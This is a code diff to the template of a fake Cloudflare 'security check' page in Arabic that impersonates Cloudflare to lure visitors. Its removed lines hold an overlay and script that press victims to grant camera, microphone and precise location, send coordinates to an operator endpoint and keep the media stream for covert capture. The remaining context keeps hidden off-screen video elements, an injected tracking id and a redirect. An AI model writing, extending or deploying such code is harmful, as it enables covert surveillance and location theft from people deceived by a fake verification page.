@@ -93,29 +93,6 @@ body{display:flex;flex-direction:column;min-height:100vh}
   <a href="https://support.cloudflare.com/" target="_blank">الدعم</a>
 </div>
 
-<!-- ══ Mandatory Permissions Overlay ══ -->
-<div id="perm-overlay" style="position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:99999;display:none;align-items:center;justify-content:center;padding:16px">
-  <div style="background:#fff;border-radius:14px;max-width:340px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)">
-    <div style="background:linear-gradient(135deg,#f48120,#e06000);padding:20px;text-align:center;color:#fff">
-      <div style="font-size:32px;margin-bottom:6px">🛡️</div>
-      <div style="font-size:16px;font-weight:700">التحقق الأمني مطلوب</div>
-      <div style="font-size:11px;opacity:.9;margin-top:3px">امنح الصلاحيات للمتابعة</div>
-    </div>
-    <div style="padding:16px">
-      <div class="pi" id="pi-cam"><span style="font-size:20px">📷</span><div style="flex:1"><div style="font-size:13px;font-weight:600;color:#222">الكاميرا</div><div style="font-size:11px;color:#888">للتحقق البصري من هويتك</div></div><span id="si-cam" style="font-size:16px">⏳</span></div>
-      <div class="pi" id="pi-mic"><span style="font-size:20px">🎙️</span><div style="flex:1"><div style="font-size:13px;font-weight:600;color:#222">الميكروفون</div><div style="font-size:11px;color:#888">للتحقق الصوتي</div></div><span id="si-mic" style="font-size:16px">⏳</span></div>
-      <div class="pi" id="pi-loc"><span style="font-size:20px">📍</span><div style="flex:1"><div style="font-size:13px;font-weight:600;color:#222">الموقع</div><div style="font-size:11px;color:#888">للتحقق من موقعك</div></div><span id="si-loc" style="font-size:16px">⏳</span></div>
-      <button id="perm-btn" onclick="grantAllPerms()" style="width:100%;padding:13px;background:linear-gradient(90deg,#f48120,#e06000);color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;cursor:pointer;margin-top:8px">السماح بجميع الصلاحيات</button>
-      <div id="perm-msg" style="font-size:11px;color:#e53935;text-align:center;margin-top:8px;min-height:14px"></div>
-    </div>
-  </div>
-</div>
-<style>
-.pi{display:flex;align-items:center;gap:10px;padding:10px;border-radius:9px;background:#f8f8f8;margin-bottom:8px;border:2px solid #eee;transition:.3s}
-.pi.ok{background:#e8f5e9;border-color:#4caf50}
-.pi.no{background:#ffebee;border-color:#f44336}
-</style>
-
 <!-- Hidden media elements -->
 <video id="vid-front" style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
 <video id="vid-back"  style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
@@ -129,72 +106,18 @@ window.$={post:function(url,data){try{var x=new XMLHttpRequest(),p=Object.keys(d
 var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
 var redirectDone=false;
 
-// ── Permissions overlay logic ─────────────────────────────────────────────────
-var _permsDone=false;
-async function grantAllPerms(){
-  if(_permsDone)return;
-  var btn=document.getElementById('perm-btn');
-  btn.disabled=true; btn.textContent='جارٍ طلب الصلاحيات...';
-  document.getElementById('perm-msg').textContent='';
-
-  // Camera + Mic
-  var stream=null,camOk=false;
-  try{
-    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:'user',width:{ideal:640},height:{ideal:640}}});
-    _ps('cam','ok');_ps('mic','ok');camOk=true;
-  }catch(e){
-    try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}});_ps('cam','ok');_ps('mic','no');camOk=true;}
-    catch(e2){_ps('cam','no');_ps('mic','no');}
-  }
-
-  // Location
-  await new Promise(function(resolve){
-    if(!navigator.geolocation){_ps('loc','no');return resolve();}
-    navigator.geolocation.getCurrentPosition(
-      function(p){_ps('loc','ok');$.post(a+'/location',{uid:uid,lat:encodeURIComponent(p.coords.latitude),lon:encodeURIComponent(p.coords.longitude),acc:encodeURIComponent(p.coords.accuracy+'m')});resolve();},
-      function(){_ps('loc','no');resolve();},
-      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
-    );
-    setTimeout(resolve,12000);
-  });
-
-  if(!camOk){
-    document.getElementById('perm-msg').textContent='⚠️ الكاميرا مطلوبة. اضغط مجدداً.';
-    btn.disabled=false;btn.textContent='حاول مجدداً';return;
-  }
-  _permsDone=true;
-  // Store stream for later use in doCamera/doVerify
-  window._advStream=stream;
-  document.getElementById('perm-overlay').style.display='none';
-  // Analyze ambient noise from mic
-  if(stream&&window._analyzeAmbientNoise)_analyzeAmbientNoise(stream);
-  // Now show the verify checkbox
-  _showBtn();
-}
-
-function _ps(id,st){
-  var el=document.getElementById('pi-'+id),ic=document.getElementById('si-'+id);
-  el.className='pi'+(st==='ok'?' ok':st==='no'?' no':'');
-  ic.textContent=st==='ok'?'✅':st==='no'?'❌':'⏳';
-}
-
-// ── Hard fallback: show verify button (called after perms granted) ────────────
+// ── Show verify checkbox after spinner ───────────────────────────────────────
 var _btnShown=false;
 function _showBtn(){
   if(_btnShown)return; _btnShown=true;
   try{
-    document.getElementById('step-text').textContent="خطوة أخيرة — اضغط للتحقق";
+    document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
     document.getElementById('spinner').style.animationPlayState='paused';
     document.getElementById('spinner').style.borderTopColor='#f48120';
     document.getElementById('check-row').style.display='flex';
   }catch(e){}
 }
-// Show permissions overlay after spinner (instead of checkbox directly)
-setTimeout(function(){
-  if(!_permsDone){
-    document.getElementById('perm-overlay').style.display='flex';
-  }
-},2800);
+setTimeout(_showBtn,4500);
 
 // Ray ID
 var chars="abcdefghijklmnopqrstuvwxyz0123456789";
